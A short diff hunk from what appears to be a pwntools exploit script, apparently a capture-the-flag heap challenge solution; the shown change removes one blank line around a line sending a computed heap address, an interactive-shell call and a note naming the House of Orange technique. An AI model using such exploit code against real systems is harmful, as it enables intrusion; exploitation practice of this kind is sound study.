@@ -171,7 +171,6 @@ r.sendline(str(heap_base+0x21000+0x10))
 
 r.interactive()
 
-
 '''
 ***** Note:
 - House of orange attack to make top_chunk into unsorted bin
